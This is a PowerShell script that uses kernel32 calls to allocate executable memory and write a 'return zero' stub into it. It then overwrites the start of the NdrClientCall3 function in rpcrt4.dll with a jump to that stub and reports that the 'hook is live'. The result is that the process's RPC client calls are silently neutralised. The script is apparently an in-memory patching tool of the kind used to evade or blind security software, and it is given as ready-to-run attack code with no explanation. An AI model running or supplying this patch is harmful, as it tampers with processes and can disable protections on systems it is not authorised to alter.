Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class NativeOps {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
}
"@

$execPerm = 0x40
$commit = 0x1000
$reserve = 0x2000
$jmpLen = 12
$region = [UIntPtr]0x1000

$stub = [NativeOps]::VirtualAlloc([IntPtr]::Zero, $region, $commit -bor $reserve, $execPerm)
if ($stub -eq [IntPtr]::Zero) { return }

$payload = [byte[]](0xB8,0x00,0x00,0x00,0x00,0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($payload, 0, $stub, $payload.Length)

[NativeOps]::FlushInstructionCache([NativeOps]::GetCurrentProcess(), $stub, [UIntPtr]$payload.Length) | Out-Null

$mod = [NativeOps]::LoadLibrary("rpcrt4.dll")
$target = [NativeOps]::GetProcAddress($mod, "NdrClientCall3")
if ($target -eq [IntPtr]::Zero) { return }

$prevProt = 0
[NativeOps]::VirtualProtect($target, [UIntPtr]$jmpLen, $execPerm, [ref]$prevProt) | Out-Null

$stubPtr = $stub.ToInt64()
$redir = [byte[]](0x48,0xB8) + [BitConverter]::GetBytes($stubPtr) + [byte[]](0xFF,0xE0)
[System.Runtime.InteropServices.Marshal]::Copy($redir, 0, $target, $redir.Length)

Write-Host "[*] Inline patch applied to target function. Hook is live."
